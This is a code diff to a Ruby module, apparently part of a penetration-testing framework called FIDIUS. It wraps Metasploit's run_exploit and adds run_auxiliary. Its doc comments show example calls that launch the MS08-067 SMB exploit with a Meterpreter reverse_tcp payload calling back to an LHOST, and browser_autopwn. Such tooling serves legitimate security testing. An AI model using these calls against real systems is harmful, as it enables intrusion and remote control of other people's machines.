@@ -42,14 +42,36 @@ module FIDIUS
       # Runs the exploit with the given name and the given opts.
       #
       # example usage: msf.run_exploit("windows/smb/ms08_067_netapi",
-      #   {"Payload" => "windows/meterpreter/reverse_tcp", "Options" =>
-      #   {"RHOST" => "192.168.56.101", "LHOST" => "192.168.56.1"}})
+      #   {"PAYLOAD" => "windows/meterpreter/reverse_tcp",
+      #     "RHOST" => "192.168.56.101", "LHOST" => "192.168.56.1"})
       #
       # @param [String]  exploit
       # @param [Hash]  opts
+      # @param [bool]  async true to start exploit in a new thread
       # @return [Msf::Session] A Session got for this exploit.
-      def run_exploit(exploit, opts)
-        daemon.run_exploit(exploit, opts)
+      def run_exploit(exploit, opts, async = true)
+        daemon.run_exploit(exploit, {
+          'Payload'  => opts['PAYLOAD'],
+          'Target'   => opts['TARGET'],
+          'RunAsJob' => async,
+          'Options'  => opts
+        })
+      end
+
+      # Runs the auxiliary with the given name and the given opts.
+      #
+      # example usage: msf.run_exploit("server/browser_autopwn",
+      #   {'LHOST' => "192.168.0.1", 'SRVHOST' => "192.168.0.1", 'URIPATH' => "/" })
+      #
+      # @param [String]  auxiliary
+      # @param [Hash]  opts
+      # @param [bool]  async true to start auxiliary in a new thread
+      def run_auxiliary(auxiliary, opts, async = true)
+        daemon.run_auxiliary(auxiliary, {
+          'Action'   => opts['ACTION'],
+          'RunAsJob' => async,
+          'Options'  => opts
+        })
       end
 
       # Adds a subscriber for the session events. This is called e.g on
